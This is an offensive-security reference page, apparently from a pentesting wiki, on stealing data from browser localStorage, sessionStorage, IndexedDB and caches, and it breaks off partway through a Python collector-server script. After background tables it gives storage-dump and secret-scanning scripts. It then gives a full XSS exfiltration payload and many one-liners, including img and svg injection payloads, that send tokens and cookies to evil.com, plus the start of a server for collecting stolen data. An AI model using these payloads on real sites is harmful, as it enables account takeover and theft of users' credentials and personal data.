---
title: Web Storage Leakage
description: Web Storage Leakage attacks — localStorage, sessionStorage, IndexedDB exploitation, token theft, cross-origin data extraction, storage event hijacking, cache storage abuse, and advanced client-side data exfiltration techniques.
navigation:
  icon: i-lucide-database
  title: Web Storage Leakage
---

## What is Web Storage Leakage?

**Web Storage Leakage** refers to the exploitation of browser-based storage mechanisms — **localStorage**, **sessionStorage**, **IndexedDB**, **Cache API**, **Cookies**, and **Web SQL** — where sensitive data such as **authentication tokens, API keys, personal information, session identifiers, encryption keys, and application secrets** are stored insecurely on the client side. Attackers leverage **XSS vulnerabilities, malicious browser extensions, shared hosting environments, subdomain attacks, and physical access** to extract this data, leading to **account takeover, identity theft, privilege escalation**, and **persistent unauthorized access**.

::callout
---
icon: i-lucide-skull
color: red
---
Web Storage is **inherently insecure for sensitive data** because it is accessible to **any JavaScript** running in the same origin. Unlike cookies with `HttpOnly` flag, **there is no browser mechanism to prevent JavaScript access to localStorage or sessionStorage**. A single XSS vulnerability exposes **everything** stored in Web Storage — tokens, keys, user data, and application state.
::

::card-group
  ::card
  ---
  title: localStorage
  icon: i-lucide-hard-drive
  ---
  Persistent key-value storage with **no expiration**. Data survives browser restarts, tab closures, and system reboots. Shared across all tabs/windows of the same origin. ~5-10MB capacity.
  ::

  ::card
  ---
  title: sessionStorage
  icon: i-lucide-clock
  ---
  Tab-scoped key-value storage that persists only for the **browser tab's lifetime**. Isolated per tab — different tabs have separate sessionStorage. Cleared when tab closes.
  ::

  ::card
  ---
  title: IndexedDB
  icon: i-lucide-cylinder
  ---
  Full **NoSQL database** in the browser. Stores structured data including files and blobs. Persistent, large capacity (hundreds of MB+), supports transactions and indexes.
  ::

  ::card
  ---
  title: Cache API / CacheStorage
  icon: i-lucide-archive
  ---
  Designed for **Service Worker offline caching**. Stores complete HTTP request/response pairs. Can contain HTML pages, API responses with tokens, and sensitive cached data.
  ::
::

---

## Web Storage Architecture

### Storage Types Comparison

| Feature | `localStorage` | `sessionStorage` | `IndexedDB` | `Cookies` | `Cache API` |
|---------|:--------------:|:-----------------:|:-----------:|:---------:|:-----------:|
| **Persistence** | Permanent | Tab lifetime | Permanent | Configurable | Permanent |
| **Capacity** | ~5-10 MB | ~5-10 MB | 100+ MB | ~4 KB each | 100+ MB |
| **Scope** | Same origin | Same origin + tab | Same origin | Domain + path | Same origin |
| **JS Accessible** | ✅ Always | ✅ Always | ✅ Always | ⚠️ Unless HttpOnly | ✅ Always |
| **Sent with HTTP** | ❌ No | ❌ No | ❌ No | ✅ Automatic | ❌ No |
| **Shared across tabs** | ✅ Yes | ❌ No | ✅ Yes | ✅ Yes | ✅ Yes |
| **Worker accessible** | ❌ No | ❌ No | ✅ Yes | ❌ No | ✅ Yes |
| **Structured data** | ❌ Strings only | ❌ Strings only | ✅ Full objects | ❌ Strings only | ✅ Request/Response |
| **XSS Exfiltrable** | ✅ Trivial | ✅ Trivial | ✅ Easy | ⚠️ If not HttpOnly | ✅ Easy |

### Storage Scope & Isolation Model

```text [storage-isolation-model.txt]
┌──────────────────────────────────────────────────────────────────┐
│               BROWSER STORAGE ISOLATION MODEL                    │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Origin = scheme + hostname + port                               │
│  https://app.example.com:443                                     │
│                                                                  │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │  Origin: https://app.example.com                         │    │
│  │                                                          │    │
│  │  localStorage:     { "token": "eyJhb...", ... }         │    │
│  │  sessionStorage:   { "cart": "[...]", ... }   (per tab) │    │
│  │  IndexedDB:        AppDB → users, settings, cache       │    │
│  │  CacheStorage:     app-v1 → cached responses            │    │
│  │  Cookies:          session_id=abc123; preferences=...    │    │
│  │                                                          │    │
│  │  ALL accessible by ANY JS on this origin!                │    │
│  │  XSS on app.example.com → ALL data exposed              │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                  │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │  Origin: https://api.example.com  (DIFFERENT origin!)    │    │
│  │                                                          │    │
│  │  localStorage:     { "api_key": "sk-...", ... }         │    │
│  │  IndexedDB:        ApiDB → responses, tokens            │    │
│  │                                                          │    │
│  │  ISOLATED from app.example.com                           │    │
│  │  BUT: XSS on api.example.com exposes THIS data          │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                  │
│  CRITICAL NOTES:                                                 │
│  ├── http:// and https:// are DIFFERENT origins                 │
│  ├── Subdomains are DIFFERENT origins                           │
│  ├── Different ports are DIFFERENT origins                      │
│  ├── But cookies can be shared across subdomains (Domain=)      │
│  ├── document.domain can merge origins (deprecated)             │
│  └── Incognito mode gets separate storage (isolated)            │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### What Developers Store (And Shouldn't)

::tabs
  :::tabs-item{icon="i-lucide-alert-triangle" label="Commonly Stored Secrets"}
  ```text [commonly-stored-secrets.txt]
  DATA COMMONLY FOUND IN WEB STORAGE:
  ════════════════════════════════════
  
  AUTHENTICATION (CRITICAL):
  ├── JWT access tokens (localStorage['token'])
  ├── JWT refresh tokens (localStorage['refresh_token'])
  ├── OAuth access tokens
  ├── OAuth refresh tokens
  ├── API keys (localStorage['api_key'])
  ├── Session identifiers
  ├── CSRF tokens
  ├── MFA backup codes
  └── Password reset tokens
  
  PERSONAL DATA (HIGH):
  ├── User profiles (name, email, phone)
  ├── Physical addresses
  ├── Payment information (partial card numbers)
  ├── Social security numbers / national IDs
  ├── Medical information
  ├── Private messages / chat history
  └── Browsing history / search queries
  
  APPLICATION STATE (MEDIUM):
  ├── User preferences and settings
  ├── Feature flags and A/B test assignments
  ├── Shopping cart contents
  ├── Draft content (emails, posts, documents)
  ├── Cached API responses
  ├── Application configuration
  ├── Encryption keys (for client-side crypto)
  └── WebSocket connection tokens
  
  INFRASTRUCTURE SECRETS (CRITICAL):
  ├── Cloud provider keys (AWS, GCP, Azure)
  ├── Database connection strings
  ├── Third-party API keys (Stripe, Twilio, SendGrid)
  ├── Firebase configuration with credentials
  ├── Private keys for signing/encryption
  ├── Webhook secrets
  └── Admin panel credentials
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Real-World Storage Examples"}
  ```javascript [real-world-storage.js]
  // Examples of what's commonly found in localStorage

  // JWT Token Storage (extremely common)
  localStorage.setItem('token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...');
  localStorage.setItem('refresh_token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...');
  localStorage.setItem('access_token', 'ya29.a0AfH6SMBx...');

  // User Profile Data
  localStorage.setItem('user', JSON.stringify({
    id: 12345,
    email: 'user@example.com',
    name: 'John Smith',
    role: 'admin',
    phone: '+1-555-0123',
    avatar: 'https://cdn.example.com/avatars/12345.jpg',
    subscription: 'enterprise',
    mfa_enabled: true
  }));

  // API Configuration
  localStorage.setItem('api_config', JSON.stringify({
    baseUrl: 'https://api.example.com',
    apiKey: 'sk_live_4eC39HqLyjWDarjtT1zdp7dc',
    webhookSecret: 'whsec_...',
    environment: 'production'
  }));

  // Firebase Config (common in SPAs)
  localStorage.setItem('firebase:authUser:AIzaSy...', JSON.stringify({
    uid: 'abc123',
    email: 'user@gmail.com',
    stsTokenManager: {
      refreshToken: 'AMf-vBw...',
      accessToken: 'eyJhbGci...',
      expirationTime: 1719500000000
    }
  }));

  // Session Data
  sessionStorage.setItem('checkout_session', JSON.stringify({
    cart: [{id: 1, name: 'Product', price: 99.99}],
    payment_intent: 'pi_3MtwBw...',
    client_secret: 'pi_3MtwBw_secret_YrKJ...',
    shipping: {
      address: '123 Main St',
      city: 'New York',
      zip: '10001'
    }
  }));

  // Encryption Keys (worst practice)
  localStorage.setItem('encryption_key', 'MIIEvgIBADANBgkqhkiG9w0B...');
  localStorage.setItem('signing_secret', 'a8f5e23c-4b67-4d89-9a12-3e56f78d90ab');
  ```
  :::
::

---

## Discovery & Reconnaissance

### Enumerating All Storage Data

::tabs
  :::tabs-item{icon="i-lucide-code" label="Complete Storage Dump"}
  ```javascript [complete-storage-dump.js]
  // Complete Web Storage Enumeration Script
  // Run in browser console or inject via XSS

  (function() {
    'use strict';
    
    const dump = {
      url: location.href,
      origin: location.origin,
      timestamp: new Date().toISOString(),
      localStorage: {},
      sessionStorage: {},
      cookies: {},
      indexedDB: { databases: [] },
      cacheStorage: { caches: [] },
      serviceWorkers: [],
      credentialManager: null
    };

    // ═══ 1. localStorage ═══
    console.log('[*] Dumping localStorage...');
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        let value = localStorage.getItem(key);
        
        // Try to parse JSON
        try { value = JSON.parse(value); } catch(e) {}
        
        dump.localStorage[key] = {
          value: value,
          size: localStorage.getItem(key).length,
          type: typeof value
        };
      }
      console.log(`  [+] localStorage: ${localStorage.length} items`);
    } catch(e) {
      dump.localStorage._error = e.message;
    }

    // ═══ 2. sessionStorage ═══
    console.log('[*] Dumping sessionStorage...');
    try {
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        let value = sessionStorage.getItem(key);
        try { value = JSON.parse(value); } catch(e) {}
        
        dump.sessionStorage[key] = {
          value: value,
          size: sessionStorage.getItem(key).length,
          type: typeof value
        };
      }
      console.log(`  [+] sessionStorage: ${sessionStorage.length} items`);
    } catch(e) {
      dump.sessionStorage._error = e.message;
    }

    // ═══ 3. Cookies ═══
    console.log('[*] Dumping cookies...');
    try {
      const cookieStr = document.cookie;
      if (cookieStr) {
        cookieStr.split(';').forEach(cookie => {
          const [name, ...valueParts] = cookie.trim().split('=');
          const value = valueParts.join('=');
          dump.cookies[name.trim()] = {
            value: decodeURIComponent(value),
            httpOnly: false // If we can read it, it's not HttpOnly
          };
        });
      }
      console.log(`  [+] Cookies: ${Object.keys(dump.cookies).length} accessible`);
      console.log('  [!] HttpOnly cookies are NOT visible to JavaScript');
    } catch(e) {
      dump.cookies._error = e.message;
    }

    // ═══ 4. IndexedDB ═══
    console.log('[*] Dumping IndexedDB...');
    async function dumpIndexedDB() {
      try {
        const databases = await indexedDB.databases();
        
        for (const dbInfo of databases) {
          const dbDump = {
            name: dbInfo.name,
            version: dbInfo.version,
            stores: {}
          };
          
          try {
            const db = await new Promise((resolve, reject) => {
              const req = indexedDB.open(dbInfo.name);
              req.onsuccess = () => resolve(req.result);
              req.onerror = () => reject(req.error);
            });
            
            const storeNames = Array.from(db.objectStoreNames);
            
            for (const storeName of storeNames) {
              try {
                const tx = db.transaction(storeName, 'readonly');
                const store = tx.objectStore(storeName);
                const allRecords = await new Promise((resolve, reject) => {
                  const req = store.getAll();
                  req.onsuccess = () => resolve(req.result);
                  req.onerror = () => reject(req.error);
                });
                
                const allKeys = await new Promise((resolve, reject) => {
                  const req = store.getAllKeys();
                  req.onsuccess = () => resolve(req.result);
                  req.onerror = () => reject(req.error);
                });
                
                dbDump.stores[storeName] = {
                  count: allRecords.length,
                  keys: allKeys.slice(0, 50),
                  records: allRecords.slice(0, 100),
                  indexes: Array.from(store.indexNames)
                };
              } catch(e) {
                dbDump.stores[storeName] = { error: e.message };
              }
            }
            
            db.close();
          } catch(e) {
            dbDump.error = e.message;
          }
          
          dump.indexedDB.databases.push(dbDump);
        }
        
        console.log(`  [+] IndexedDB: ${databases.length} databases`);
      } catch(e) {
        dump.indexedDB._error = e.message;
        
        // Fallback for browsers without indexedDB.databases()
        console.log('  [!] indexedDB.databases() not supported, trying known names...');
        const commonDBNames = [
          'keyval-store', 'firebaseLocalStorageDb', 'localforage',
          '__dbnames', 'idb-keyval', '_pouch_', 'workbox-expiration',
          'app-db', 'cache', 'data', 'offline', 'sync'
        ];
        
        for (const name of commonDBNames) {
          try {
            const req = indexedDB.open(name);
            req.onsuccess = function() {
              const db = req.result;
              if (db.objectStoreNames.length > 0) {
                console.log(`  [+] Found DB: ${name} (${db.objectStoreNames.length} stores)`);
              }
              db.close();
            };
          } catch(e) {}
        }
      }
    }

    // ═══ 5. Cache Storage ═══
    console.log('[*] Dumping Cache Storage...');
    async function dumpCacheStorage() {
      try {
        const cacheNames = await caches.keys();
        
        for (const cacheName of cacheNames) {
          const cache = await caches.open(cacheName);
          const requests = await cache.keys();
          
          const entries = [];
          for (const request of requests.slice(0, 50)) {
            const response = await cache.match(request);
            let bodyPreview = '';
            
            try {
              const clone = response.clone();
              const text = await clone.text();
              bodyPreview = text.substring(0, 500);
            } catch(e) {}
            
            entries.push({
              url: request.url,
              method: request.method,
              status: response.status,
              headers: Object.fromEntries(response.headers.entries()),
              bodyPreview: bodyPreview
            });
          }
          
          dump.cacheStorage.caches.push({
            name: cacheName,
            entryCount: requests.length,
            entries: entries
          });
        }
        
        console.log(`  [+] Cache Storage: ${cacheNames.length} caches`);
      } catch(e) {
        dump.cacheStorage._error = e.message;
      }
    }

    // ═══ 6. Service Workers ═══
    console.log('[*] Checking Service Workers...');
    async function checkServiceWorkers() {
      try {
        const registrations = await navigator.serviceWorker.getRegistrations();
        dump.serviceWorkers = registrations.map(reg => ({
          scope: reg.scope,
          scriptURL: reg.active?.scriptURL,
          state: reg.active?.state,
          updateViaCache: reg.updateViaCache
        }));
        console.log(`  [+] Service Workers: ${registrations.length}`);
      } catch(e) {
        dump.serviceWorkers = [{ error: e.message }];
      }
    }

    // ═══ Run all async dumps and produce report ═══
    Promise.all([
      dumpIndexedDB(),
      dumpCacheStorage(),
      checkServiceWorkers()
    ]).then(() => {
      // Analyze for sensitive data
      analyzeSensitiveData(dump);
      
      console.log('\n═══════════════════════════════════════');
      console.log(' COMPLETE STORAGE DUMP');
      console.log('═══════════════════════════════════════');
      console.log(JSON.stringify(dump, null, 2));
      
      // Store globally for inspection
      window.__storageDump = dump;
      console.log('\n[*] Full dump available at: window.__storageDump');
    });

    function analyzeSensitiveData(data) {
      const sensitivePatterns = [
        { name: 'JWT Token', pattern: /eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/ },
        { name: 'API Key', pattern: /(?:sk|pk|api)[_-](?:live|test|prod)[_-][A-Za-z0-9]{20,}/ },
        { name: 'AWS Key', pattern: /AKIA[0-9A-Z]{16}/ },
        { name: 'AWS Secret', pattern: /[A-Za-z0-9/+=]{40}/ },
        { name: 'Private Key', pattern: /-----BEGIN (?:RSA |EC )?PRIVATE KEY-----/ },
        { name: 'Bearer Token', pattern: /Bearer\s+[A-Za-z0-9-_.~+\/]+/ },
        { name: 'Password', pattern: /(?:password|passwd|pwd)\s*[:=]\s*['"]\S+/i },
        { name: 'Email', pattern: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/ },
        { name: 'Credit Card', pattern: /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/ },
        { name: 'SSN', pattern: /\b\d{3}-\d{2}-\d{4}\b/ },
        { name: 'UUID/GUID', pattern: /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i },
        { name: 'Firebase Token', pattern: /AMf-[A-Za-z0-9-_]+/ },
        { name: 'Google OAuth', pattern: /ya29\.[A-Za-z0-9-_]+/ },
        { name: 'Stripe Key', pattern: /(?:sk|pk|rk)_(?:live|test)_[A-Za-z0-9]+/ },
        { name: 'GitHub Token', pattern: /gh[pours]_[A-Za-z0-9_]{36,}/ },
        { name: 'Slack Token', pattern: /xox[baprs]-[A-Za-z0-9-]+/ }
      ];
      
      const fullStr = JSON.stringify(data);
      const findings = [];
      
      sensitivePatterns.forEach(({ name, pattern }) => {
        const matches = fullStr.match(new RegExp(pattern.source, 'g'));
        if (matches) {
          matches.forEach(m => {
            findings.push({ type: name, value: m.substring(0, 80) + '...' });
            console.log(`%c[!] SENSITIVE DATA: ${name} found: ${m.substring(0, 60)}...`,
              'color:red;font-weight:bold');
          });
        }
      });
      
      dump._sensitive_findings = findings;
      console.log(`\n[*] Total sensitive findings: ${findings.length}`);
    }
  })();
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Browser DevTools Method"}
  ```text [devtools-enumeration.txt]
  MANUAL STORAGE ENUMERATION VIA DEVTOOLS:
  ═════════════════════════════════════════
  
  CHROME / EDGE:
  ──────────────
  1. Open DevTools (F12)
  2. Go to "Application" tab
  3. Left sidebar shows:
     ├── Local Storage → click domain → see all key-value pairs
     ├── Session Storage → click domain → see all key-value pairs
     ├── IndexedDB → expand databases → browse object stores
     ├── Cookies → click domain → see all cookies
     ├── Cache Storage → expand caches → see cached responses
     └── Service Workers → see registered workers
  
  FIREFOX:
  ────────
  1. Open DevTools (F12)
  2. Go to "Storage" tab
  3. Left sidebar shows all storage types
  4. IndexedDB shows databases, stores, and records
  5. Cache Storage shows all cached request/response pairs
  
  SAFARI:
  ───────
  1. Enable Developer menu (Preferences → Advanced)
  2. Open Web Inspector (Cmd+Option+I)
  3. Go to "Storage" tab
  4. Browse Local Storage, Session Storage, IndexedDB, Cookies
  
  CONSOLE QUICK COMMANDS:
  ───────────────────────
  // Dump all localStorage
  JSON.stringify(localStorage, null, 2)
  
  // Dump all sessionStorage
  JSON.stringify(sessionStorage, null, 2)
  
  // Dump all accessible cookies
  document.cookie
  
  // List IndexedDB databases
  indexedDB.databases().then(dbs => console.log(dbs))
  
  // List cache names
  caches.keys().then(names => console.log(names))
  
  // Count total stored items
  console.log('localStorage:', localStorage.length);
  console.log('sessionStorage:', sessionStorage.length);
  ```
  :::
::

### Automated Sensitive Data Scanner

::code-collapse

```javascript [sensitive-data-scanner.js]
// Automated Sensitive Data Scanner for Web Storage
// Scans all client-side storage for sensitive patterns

(function SensitiveDataScanner() {
  'use strict';
  
  const SEVERITY = { CRITICAL: '🔴', HIGH: '🟠', MEDIUM: '🟡', LOW: '🟢' };
  
  const patterns = [
    // Authentication
    { name: 'JWT Token', severity: SEVERITY.CRITICAL, regex: /eyJ[A-Za-z0-9-_]{10,}\.eyJ[A-Za-z0-9-_]{10,}\.[A-Za-z0-9-_]{10,}/ },
    { name: 'OAuth Access Token', severity: SEVERITY.CRITICAL, regex: /(?:access_token|oauth_token)["':\s=]+["']?([A-Za-z0-9-_.]{20,})/ },
    { name: 'Refresh Token', severity: SEVERITY.CRITICAL, regex: /(?:refresh_token)["':\s=]+["']?([A-Za-z0-9-_.]{20,})/ },
    { name: 'Session ID', severity: SEVERITY.CRITICAL, regex: /(?:session_?id|sid|PHPSESSID|JSESSIONID|connect\.sid)["':\s=]+["']?([A-Za-z0-9-_.]{16,})/ },
    { name: 'CSRF Token', severity: SEVERITY.HIGH, regex: /(?:csrf|xsrf|_token)["':\s=]+["']?([A-Za-z0-9-_./+=]{16,})/ },
    
    // Cloud & API Keys
    { name: 'AWS Access Key', severity: SEVERITY.CRITICAL, regex: /AKIA[0-9A-Z]{16}/ },
    { name: 'AWS Secret Key', severity: SEVERITY.CRITICAL, regex: /(?:aws_secret|secret_key)["':\s=]+["']?([A-Za-z0-9/+=]{40})/ },
    { name: 'Google API Key', severity: SEVERITY.HIGH, regex: /AIza[0-9A-Za-z-_]{35}/ },
    { name: 'Google OAuth Token', severity: SEVERITY.CRITICAL, regex: /ya29\.[0-9A-Za-z-_]+/ },
    { name: 'Firebase Token', severity: SEVERITY.CRITICAL, regex: /AMf-v[A-Za-z0-9-_]{100,}/ },
    { name: 'Stripe Key', severity: SEVERITY.CRITICAL, regex: /(?:sk|pk|rk)_(?:live|test)_[A-Za-z0-9]{20,}/ },
    { name: 'GitHub Token', severity: SEVERITY.CRITICAL, regex: /gh[pours]_[A-Za-z0-9_]{36,}/ },
    { name: 'Slack Token', severity: SEVERITY.CRITICAL, regex: /xox[baprs]-[0-9]+-[A-Za-z0-9-]+/ },
    { name: 'Twilio Key', severity: SEVERITY.HIGH, regex: /SK[0-9a-fA-F]{32}/ },
    { name: 'SendGrid Key', severity: SEVERITY.HIGH, regex: /SG\.[A-Za-z0-9-_]{22}\.[A-Za-z0-9-_]{43}/ },
    { name: 'Mailgun Key', severity: SEVERITY.HIGH, regex: /key-[0-9a-zA-Z]{32}/ },
    { name: 'Heroku API Key', severity: SEVERITY.HIGH, regex: /[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}/ },
    
    // Cryptographic Material
    { name: 'Private Key', severity: SEVERITY.CRITICAL, regex: /-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----/ },
    { name: 'Encryption Key (Hex)', severity: SEVERITY.HIGH, regex: /(?:encryption_key|secret_key|aes_key)["':\s=]+["']?([0-9a-fA-F]{32,64})/ },
    { name: 'Base64 Key (long)', severity: SEVERITY.MEDIUM, regex: /(?:key|secret)["':\s=]+["']?([A-Za-z0-9+/]{40,}={0,2})/ },
    
    // Personal Data
    { name: 'Email Address', severity: SEVERITY.MEDIUM, regex: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/ },
    { name: 'Phone Number', severity: SEVERITY.MEDIUM, regex: /(?:\+?1[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/ },
    { name: 'Credit Card', severity: SEVERITY.CRITICAL, regex: /\b(?:4\d{3}|5[1-5]\d{2}|3[47]\d{2}|6(?:011|5\d{2}))\d{8,12}\b/ },
    { name: 'SSN', severity: SEVERITY.CRITICAL, regex: /\b\d{3}-\d{2}-\d{4}\b/ },
    { name: 'Date of Birth', severity: SEVERITY.MEDIUM, regex: /(?:dob|date_of_birth|birthdate)["':\s=]+["']?\d{4}[-/]\d{2}[-/]\d{2}/ },
    
    // Infrastructure
    { name: 'Database URL', severity: SEVERITY.CRITICAL, regex: /(?:mongodb|postgres|mysql|redis|amqp):\/\/[^\s'"]+/ },
    { name: 'Internal URL', severity: SEVERITY.MEDIUM, regex: /https?:\/\/(?:10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+)/ },
    { name: 'Webhook URL', severity: SEVERITY.HIGH, regex: /(?:hooks\.slack\.com|discord(?:app)?\.com\/api\/webhooks)\/[^\s'"]+/ },
    { name: 'Bearer Auth Header', severity: SEVERITY.CRITICAL, regex: /[Bb]earer\s+[A-Za-z0-9\-._~+\/]+=*/ }
  ];
  
  const findings = [];
  
  function scan(source, data) {
    const str = typeof data === 'string' ? data : JSON.stringify(data);
    if (!str) return;
    
    patterns.forEach(({ name, severity, regex }) => {
      const matches = str.match(new RegExp(regex.source, 'gi'));
      if (matches) {
        matches.forEach(match => {
          const finding = {
            severity,
            type: name,
            source,
            value: match.length > 100 ? match.substring(0, 100) + '...' : match,
            fullLength: match.length
          };
          findings.push(finding);
          console.log(
            `${severity} [${name}] in ${source}: ${match.substring(0, 80)}...`
          );
        });
      }
    });
  }
  
  // Scan localStorage
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    scan(`localStorage["${key}"]`, key);
    scan(`localStorage["${key}"]`, localStorage.getItem(key));
  }
  
  // Scan sessionStorage
  for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    scan(`sessionStorage["${key}"]`, key);
    scan(`sessionStorage["${key}"]`, sessionStorage.getItem(key));
  }
  
  // Scan cookies
  scan('document.cookie', document.cookie);
  
  // Scan page content for storage-related JS
  const scripts = document.querySelectorAll('script:not([src])');
  scripts.forEach((s, i) => {
    scan(`inline-script[${i}]`, s.textContent);
  });
  
  // Summary
  console.log('\n═══════════════════════════════════════');
  console.log(` SCAN COMPLETE: ${findings.length} findings`);
  console.log('═══════════════════════════════════════');
  
  const bySeverity = {};
  findings.forEach(f => {
    bySeverity[f.severity] = (bySeverity[f.severity] || 0) + 1;
  });
  Object.entries(bySeverity).forEach(([sev, count]) => {
    console.log(`  ${sev} ${count} findings`);
  });
  
  window.__sensitiveFindings = findings;
  return findings;
})();
```

::

---

## Payloads & Exploitation Techniques

### localStorage / sessionStorage Exfiltration via XSS

::tabs
  :::tabs-item{icon="i-lucide-code" label="Complete Storage Theft"}
  ```javascript [storage-theft.js]
  // Complete Web Storage Exfiltration Payload
  // Inject via XSS to steal ALL client-side stored data

  (function() {
    'use strict';
    
    const EXFIL_URL = 'https://evil.com/storage-steal';
    
    const loot = {
      timestamp: new Date().toISOString(),
      origin: location.origin,
      url: location.href,
      userAgent: navigator.userAgent,
      
      // localStorage (persistent data)
      localStorage: {},
      
      // sessionStorage (tab-specific data)
      sessionStorage: {},
      
      // Accessible cookies (non-HttpOnly)
      cookies: document.cookie,
      
      // Page-embedded secrets
      pageSecrets: {}
    };

    // Dump localStorage
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        loot.localStorage[key] = localStorage.getItem(key);
      }
    } catch(e) { loot.localStorage._error = e.message; }

    // Dump sessionStorage
    try {
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        loot.sessionStorage[key] = sessionStorage.getItem(key);
      }
    } catch(e) { loot.sessionStorage._error = e.message; }

    // Extract secrets from page
    try {
      // Meta tags
      document.querySelectorAll('meta[name*="token"],meta[name*="csrf"],meta[name*="key"]')
        .forEach(m => { loot.pageSecrets[m.name] = m.content; });
      
      // Hidden inputs
      document.querySelectorAll('input[type="hidden"]')
        .forEach(i => { loot.pageSecrets['hidden_' + (i.name || i.id)] = i.value; });
      
      // Data attributes with tokens
      document.querySelectorAll('[data-token],[data-api-key],[data-auth]')
        .forEach(el => {
          Object.keys(el.dataset).forEach(k => {
            loot.pageSecrets['data_' + k] = el.dataset[k];
          });
        });
        
      // Window globals that might contain secrets
      ['__NEXT_DATA__', '__NUXT__', '__APP_CONFIG__', 'CONFIG', 'config', 
       'appConfig', 'ENV', '__INITIAL_STATE__', 'REDUX_STATE'].forEach(g => {
        if (window[g]) {
          loot.pageSecrets[g] = JSON.stringify(window[g]).substring(0, 5000);
        }
      });
    } catch(e) {}

    // Multi-method exfiltration
    const payload = JSON.stringify(loot);
    
    // Method 1: sendBeacon (most reliable)
    try { navigator.sendBeacon(EXFIL_URL, payload); } catch(e) {}
    
    // Method 2: fetch
    try {
      fetch(EXFIL_URL, {
        method: 'POST',
        mode: 'no-cors',
        body: payload
      });
    } catch(e) {}
    
    // Method 3: Image beacon for small data
    try {
      const critical = {
        token: loot.localStorage.token || loot.localStorage.access_token,
        cookie: loot.cookies.substring(0, 500),
        refresh: loot.localStorage.refresh_token
      };
      new Image().src = EXFIL_URL + '?d=' + btoa(JSON.stringify(critical));
    } catch(e) {}
    
  })();
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="One-Liner Payloads"}
  ```javascript [oneliner-payloads.js]
  // ═══ MINIMAL ONE-LINERS FOR QUICK EXFILTRATION ═══

  // Steal localStorage token
  new Image().src='https://evil.com/s?t='+localStorage.token

  // Steal all localStorage
  fetch('https://evil.com/s',{method:'POST',mode:'no-cors',body:JSON.stringify(localStorage)})

  // Steal all sessionStorage
  navigator.sendBeacon('https://evil.com/s',JSON.stringify(sessionStorage))

  // Steal localStorage + cookies
  new Image().src='https://evil.com/s?ls='+btoa(JSON.stringify(localStorage))+'&c='+btoa(document.cookie)

  // Steal specific keys
  new Image().src='https://evil.com/s?t='+localStorage.getItem('token')+'&r='+localStorage.getItem('refresh_token')

  // Steal all storage combined
  navigator.sendBeacon('https://evil.com/s',JSON.stringify({l:localStorage,s:sessionStorage,c:document.cookie}))

  // Steal JWT and decode payload (for info extraction)
  (function(){var t=localStorage.token;if(t){var p=JSON.parse(atob(t.split('.')[1]));new Image().src='https://evil.com/s?jwt='+btoa(JSON.stringify(p))}})()

  // Steal Firebase auth user
  (function(){for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);if(k.startsWith('firebase:')){new Image().src='https://evil.com/s?fb='+btoa(localStorage.getItem(k))}}})()

  // XSS payload for <img> tag injection
  // <img src=x onerror="fetch('https://evil.com/s',{method:'POST',mode:'no-cors',body:JSON.stringify(localStorage)})">

  // XSS payload for <svg> tag injection
  // <svg onload="navigator.sendBeacon('https://evil.com/s',JSON.stringify({l:localStorage,c:document.cookie}))">
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Exfiltration Server"}
  ```python [storage-exfil-server.py]
  #!/usr/bin/env python3
  """
  Web Storage Exfiltration Collector Server
  Receives and analyzes stolen storage data
  """

  from http.server import HTTPServer, BaseHTTPRequestHandler
  from urllib.parse import urlparse, parse_qs, unquote
  from datetime import datetime
  import json, base64, re, os

  LOG_DIR = 'stolen_storage'
  os.makedirs(LOG_DIR, exist_ok=True)

  # Sensitive data patterns for auto-analysis
  SENSITIVE_PATTERNS = {
      'JWT Token': re.compile(r'eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+'),
      'AWS Key': re.compile(r'AKIA[0-9A-Z]{16}'),
      'Stripe Key': re.compile(r'(?:sk|pk)_(?:live|test)_[A-Za-z0-9]+'),
      'Private Key': re.compile(r'-----BEGIN.*PRIVATE KEY-----'),
      'GitHub Token': re.compile(r'gh[pours]_[A-Za-z0-9_]{36,}'),
      'Google OAuth': re.compile(r'ya29\.[A-Za-z0-9-_]+'),
      'Firebase': re.compile(r'AMf-v[A-Za-z0-9-_]{50,}'),
      'Email': re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'),
      'Credit Card': re.compile(r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b'),
  }

  class CollectorHandler(BaseHTTPRequestHandler):
      def handle_data(self, data_str):
          timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
          source_ip = self.client_address[0]
          
          # Try to parse JSON
          try:
